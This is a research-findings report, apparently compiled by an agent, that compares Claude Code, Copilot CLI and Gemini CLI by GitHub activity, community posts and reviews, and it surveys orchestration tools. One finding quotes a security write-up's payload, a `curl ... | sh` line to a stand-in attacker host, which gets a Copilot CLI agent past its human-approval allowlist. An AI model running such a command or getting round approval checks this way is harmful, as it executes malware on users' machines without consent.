# Deep-Dive Findings

## Scope
Build high-trust evidence for the Coding CLIs tier (Claude Code, Copilot CLI, Gemini CLI) while capturing the new orchestration/context contenders the discovery stage surfaced.

## Date
2026-03-25T04:00:00+00:00

## Inputs
- HN Algolia queries for "Claude Code CLI" (points>10) + the Superset/Grov/Emdash threads.
- WebFetch: GitHub API hits (repos, releases, commits), PromptArmor malware write-up, FreeAcademy & GuruSup comparisons, Claude/Google docs, skills.sh registry glance.
- Twitter/X research via node .agents/skills/x-twitter/x.js search for "Claude Code", "Copilot CLI", "Gemini CLI" (relevancy, ~20 results each).
- Reddit pulls (curl/parse of /search.json for Claude Code, Copilot CLI, Gemini CLI keywords).
- YouTube scrape (fetch_youtube_videos.py) for review/tutorial/comparison queries per CLI.

## Findings
- **[STRONG]** Claude Code remains the reference agent CLI: release v2.1.81 on 2026-03-20 shipped --bare, --channels, and improved MCP OAuth while the GH repo still commands 82,204 stars and ~100 commits between 2026-01-29 and 2026-03-20 (~14/week across 10+ authors).
  Source: https://api.github.com/repos/anthropics/claude-code/releases/tag/v2.1.81
  Source: https://api.github.com/repos/anthropics/claude-code (stars/commit snapshot)
  Date: 2026-03-25 | Engagement: 82,204 watchers / 6,873 forks
  Who: Anthropic release engineers + terminal-focused community
  Key quote: "Added `--bare` flag ... smart worktree resumption ... Improved MCP OAuth ..."
  Why it matters: Consistent production releases and deep Git watchfulness keep Claude Code the go-to when reliability matters.
- **[STRONG]** Reliability narratives remain visible: the 181-point HN thread Claude Code CLI was broken linked to GH issue #16673 describing how the changelog parser refused to start on v2.1.0, proving fixes must be fast to retain trust.
  Source: https://news.ycombinator.com/item?id=46532075
  Source: https://github.com/anthropics/claude-code/issues/16673
  Date: 2026-01-07 | Engagement: 181 HN points / 76 comments
  Who: 0xBigBoss (user) + maintainers
  Key quote: "update to claude 2.1.0 then run claude. see the error."
  Why it matters: The whole community watched the failure & fix, so visibility of regressions is now part of Claude's trust story.
- **[STRONG]** Organic interest continues—an X thread (74 likes) titled "How to Master Claude Code (If You Don't Code)" breaks down workflow primitives (reads/edits/runs commands) and spawns replies comparing Copilot CLI, demonstrating that the terminal-based workflow remains the baseline for new multi-agent tutorials.
  Source: https://x.com/1445377133547765763/status/2035562903655379153
  Date: 2026-03-22 | Engagement: 74 likes / 8 replies
  Who: workflow evangelist
  Key quote: "Claude Code works directly on your computer ... reads, edits, runs commands, builds & fixes things."
  Why it matters: High engagement proves the terminal-based workflow still sells to the broader AI coding club.
- **[STRONG]** GitHub Copilot CLI is shipping cross-platform builds (release v1.0.11, 2026-03-23) with --channels, merged hook fixes, and multiple asset downloads while keeping 9,552 stars and 100 commits between 2026-01-08 and 2026-03-23 (~10 weeks, ~10 authors).
  Source: https://api.github.com/repos/github/copilot-cli/releases/tag/v1.0.11
  Source: https://api.github.com/repos/github/copilot-cli/commits?per_page=100
  Date: 2026-03-25 | Engagement: 9,552 watchers / 1,296 forks
  Who: GitHub product+release bot
  Key quote: "`/clear` now abandons the current session entirely ... GitHub MCP user configs respected ... multi-extension hooks now merge."
  Why it matters: Frequent releases and multi-platform assets keep the enterprise CLI aligned with the Copilot brand.
- **[STRONG]** PromptArmor documented a Copilot CLI remote-code story right after GA (HN ID 47183940, 62 points). The attack payload `env curl -s "https://[ATTACKER_URL].com/bugbot" | env sh` bypasses the human-in-the-loop read-only list, so security teams must whitelist or block CLI downloads.
  Source: https://www.promptarmor.com/resources/github-copilot-cli-downloads-and-executes-malware
  Source: https://news.ycombinator.com/item?id=47183940
  Date: 2026-02-27 | Engagement: 62 HN points / 22 comments
  Who: independent security researcher + community
  Key quote: "A malicious command uses `env curl ... | env sh` to download and execute malware without any human approval."
  Why it matters: The CLI’s automated agent model must be paired with enforcement or offline proxies before enterprises trust it fully.
- **[STRONG]** Reddit r/GithubCopilot (185 upvotes) and a GitHub-hosted demo tweet (61 likes) show the Copilot CLI experimenters sharing ready-to-run repos, signaling a small but committed evangelist community.
  Source: https://www.reddit.com/r/GithubCopilot/comments/1rejfyh/github_copilot_cli_is_now_generally_available/
  Source: https://x.com/3272341/status/2034874929796260001
  Date: Mar 2026 | Engagement: 185 upvotes / 61 likes
  Key quote: "This repo recreates the Copilot CLI presentation so you can run the demo yourself."
  Why it matters: Social momentum keeps Copilot CLI top-of-mind for teams building multi-agent demos despite the security scrutiny.
- **[STRONG]** Gemini CLI tops the star chart (98,957) and published release v0.35.0 on 2026-03-24 with keybinding, policy, and telemetry improvements; 100 commits between 2026-03-19 and 2026-03-25 show <1-week velocity, and Google’s docs tout the 1M-token context/60 rps free tier.
  Source: https://api.github.com/repos/google-gemini/gemini-cli/releases/tag/v0.35.0
  Source: https://api.github.com/repos/google-gemini/gemini-cli/commits?per_page=100
  Source: https://docs.cloud.google.com/gemini/docs/codeassist/gemini-cli
  Date: 2026-03-25 | Engagement: 98,957 watchers / 12,593 forks
  Who: Google Gemini release team + docs writers
  Key quote: "Gemini CLI uses a ReAct loop ... can help you fix bugs, create features, and improve coverage ... 1,000 requests/day free tier with 1M tokens."
  Why it matters: The free-tier + premium context window makes Gemini CLI the natural entry point and the richest open-source option.
- **[MODERATE]** FreeAcademy’s 2026 table codifies the Claude/Copilot/Gemini trade-offs: Gemini is the free 1M-token starter, Claude commands the paid quality lane, and Copilot still lacks multi-agent parity today.
  Source: http://freeacademy.ai/blog/claude-code-vs-copilot-cli-vs-gemini-cli-comparison-2026
  Date: 2026-02-15 | Engagement: comparison table
  Key quote: "Claude Code – 200K tokens at $20/mo; Copilot CLI – paid; Gemini CLI – 1M tokens, 1,000 requests/day free, Apache 2.0."
  Why it matters: Helps justify ranking weights for context, price, and multi-agent readiness.
- **[MODERATE]** GuruSup’s 2026 write-up reiterates the cost/context split: "Gemini CLI is the better starting point ... The 1M context window means you can work on personal projects of any size without worrying about token limits" before switching to Claude when hallucinations creep in.
  Source: http://gurusup.com/blog/gemini-cli-vs-claude-code
  Date: 2026-03-22 | Engagement: evergreen article
  Key quote: "Gemini CLI is the better starting point ... The 1M context window means you can work on personal projects of any size without worrying about token limits."
  Why it matters: Supports the editorial claim that Gemini is the entry point and Claude the quality/backstop.
- **[STRONG]** Emdash is a new agentic development environment (2,864 stars) whose 206-pt HN launch explains 21 supported CLIs, SSH-capable worktrees, and <1s task startups via pre-warmed worktrees.
  Source: https://news.ycombinator.com/item?id=47140322
  Source: https://api.github.com/repos/generalaction/emdash
  Date: 2026-02-24 | Engagement: 206 HN points
  Who: generalaction founders (Arne & Raban)
  Key quote: "Emdash puts the terminal at the center ... Each agent runs as a task in its own git worktree ... we support 21 coding agent CLIs."
  Why it matters: A potential catalog addition that orchestrates the CLI triad while keeping agent-of-record behavior.
- **[STRONG]** Superset (7,879 stars) similarly orchestrates multi-agent tasks with one-click worktrees, agent isolation per tab, and push notifications, and the founders report 2–3× faster development runs.
  Source: https://news.ycombinator.com/item?id=46109015
  Source: https://api.github.com/repos/superset-sh/superset
  Date: 2025-12-01 | Engagement: 24 HN points
  Who: Superset engineers (Kiet/Avi/Satya)
  Key quote: "Superset aims to be a superset of all the best AI coding tools ... One-click Git worktree creation ... push notifications when agents are done."
  Why it matters: Another OSS orchestration to track, especially for teams juggling >10 agents.
- **[STRONG]** Grov (177 stars) is a context layer that gives agents shared, decision-grain memory with preview→expand injection, cutting token spend 50–70% so teammates don’t rehash the same architectural decisions.
  Source: https://news.ycombinator.com/item?id=46711958
  Source: https://api.github.com/repos/TonyStef/Grov
  Date: 2026-01-21 | Engagement: 24 HN points
  Who: TonyStef
  Key quote: "Grov is an open-source context layer ... preview→expand strategy ... 50-70% token reduction."
  Why it matters: The shared memory layer addresses the persistent context gap our CLI ranking doesn’t yet cover.

## Quantitative traction
| Skill | GitHub stars (2026-03-25) | Recent activity | Fresh signal(s) | Evidence |
| --- | --- | --- | --- | --- |
| Claude Code | 82,204 | 100 commits (2026-01-29 → 2026-03-20, ~14/week) | HN bug thread (181 pts) + 74-like X thread | GH API + https://news.ycombinator.com/item?id=46532075 + https://x.com/1445377133547765763/status/2035562903655379153 |
| GitHub Copilot CLI | 9,552 | 100 commits (2026-01-08 → 2026-03-23) | Reddit GA (185 upvotes) + PromptArmor exploit + demo tweet (61 likes) | GH API + https://www.reddit.com/r/GithubCopilot/comments/1rejfyh/github_copilot_cli_is_now_generally_available/ + https://news.ycombinator.com/item?id=47183940 + https://www.promptarmor.com/resources/github-copilot-cli-downloads-and-executes-malware + https://x.com/3272341/status/2034874929796260001 |
| Gemini CLI | 98,957 | 100 commits (2026-03-19 → 2026-03-25) | FreeAcademy comparison + GuruSup article + Reddit 894-score thread | GH API + http://freeacademy.ai/... + http://gurusup.com/... + https://www.reddit.com/r/GeminiAI/comments/1rhvook/gemini_31_went_existential_on_me_bro_im_freaked/ |
| Emdash | 2,864 | 2026-03-25 push | 206-pt HN thread, warm worktrees + SSH | GH API + https://news.ycombinator.com/item?id=47140322 |
| Superset | 7,879 | 2026-03-25 push | 24-pt HN thread reporting 2–3× speed-ups | GH API + https://news.ycombinator.com/item?id=46109015 |
| Grov | 177 | 2026-01-29 push | 24-pt HN article on memory reduction | GH API + https://news.ycombinator.com/item?id=46711958 |

## Pairwise comparisons
- **Cost/context**: FreeAcademy’s 2026 table slots Gemini CLI as the only free tool with a 1M-token window, Claude Code as the $20/high-quality lane, and Copilot CLI still waiting on multi-agent parity. This explains why our editorial order privileges context size + price before latency.
  Source: http://freeacademy.ai/blog/claude-code-vs-copilot-cli-vs-gemini-cli-comparison-2026
  Key quote: "Claude Code – 200K tokens at $20/mo; Copilot CLI – paid; Gemini CLI – 1M tokens, 1,000 requests/day free, Apache 2.0."
- **Entry point**: GuruSup’s 2026 write-up says "Gemini CLI is the better starting point ... The 1M context window means you can work on personal projects of any size without worrying about token limits" before switching to Claude when hallucinations creep in.
  Source: http://gurusup.com/blog/gemini-cli-vs-claude-code
  Key quote: "Gemini CLI is the better starting point ... The 1M context window means you can work on personal projects of any size without worrying about token limits."

## YouTube videos for Claude Code
- youtubeId: "ocQ7ZKhHU5Q", title: "Claude Code on your Phone is OFFICIAL (it changes  everything)", channel: "NetworkChuck", published: "3 weeks ago"
- youtubeId: "kZ-zzHVUrO4", title: "Как я использую Claude Code для реальной инженерии", channel: "Matt Pocock", published: "4 months ago"
- youtubeId: "7MmUUs4HVms", title: "Claude Code: полный курс для начинающих (2026)", channel: "Никита Ефимов | ИИ и автоматизация", published: "8 days ago"

## YouTube videos for GitHub Copilot CLI
- youtubeId: "CqcqWLv-sDM", title: "You need to try the GitHub Copilot CLI right now", channel: "Burke Holland", published: "1 month ago"
- youtubeId: "VkOibxsQ1oU", title: "The ultimate guide to the GitHub Copilot CLI | Full demo", channel: "GitHub Checkout", published: "5 months ago"
- youtubeId: "BDxRhhs36ns", title: "Getting started with GitHub Copilot CLI | Tutorial for beginners", channel: "GitHub", published: "2 weeks ago"

## YouTube videos for Gemini CLI
- youtubeId: "bTLmt9BKGVc", title: "Master Gemini 3.1 for Work in 12 Minutes (2026)", channel: "Jeff Su", published: "3 months ago"
- youtubeId: "1AF5pFGwRTM", title: "Учебное пособие по Gemini CLI №1 — Введение и настройка", channel: "Net Ninja", published: "3 months ago"
- youtubeId: "WxXUbiz6RQE", title: "Gemini CLI: Everything You Need To Know (Full Tutorial)", channel: "lustoykov", published: "4 months ago"

## Quotes
- "Emdash puts the terminal at the center and makes it easy to run multiple agents at once ... Each agent runs as a task in its own git worktree ... we support 21 coding agent CLIs today" (Hacker News, 2026-02-24, https://news.ycombinator.com/item?id=47140322).
- "Superset aims to be a superset of all the best AI coding tools ... One-click Git worktree creation ... push notifications when agents are done" (Hacker News, 2025-12-01, https://news.ycombinator.com/item?id=46109015).
- "Grov is an open-source context layer ... preview→expand strategy reduces token spend by 50–70%" (Hacker News, 2026-01-21, https://news.ycombinator.com/item?id=46711958).

## Recommended Next Step
- Add Emdash/Superset to the catalog with their orchestration evidence (GH stars/HN story) and watch for downloads or worktree metrics to confirm real-world usage.
- Track Copilot CLI adoption in registries and security channels (PromptArmor bypass, corporate policy) before promoting it to Tier 1 narratives.
- Investigate Grov’s integration path for our CLI leaders so we can cite hard evidence that shared memory does indeed cut tokens and keeps agents in sync.

## Gaps in Evidence, Unresolved Questions, Remaining Work
- Gaps: Independent first-pass quality benchmarks (SWE-bench style) for Claude vs Copilot vs Gemini; install-count/pass-through metrics for Emdash and Superset remain missing.
- Unresolved questions: Can Grov’s preview→expand model scale for large orgs that already retain logs, and can Copilot CLI’s yolo/`env curl` settings survive enterprise policies? Need confirmation.
- Remaining work: Collect skills.sh usage counts for new orchestrators, keep logging YouTube/Twitter engagement for the three core CLIs, and plan a follow-up ralph deep-dive after cataloging Emdash/Superset/Grov.
'@"
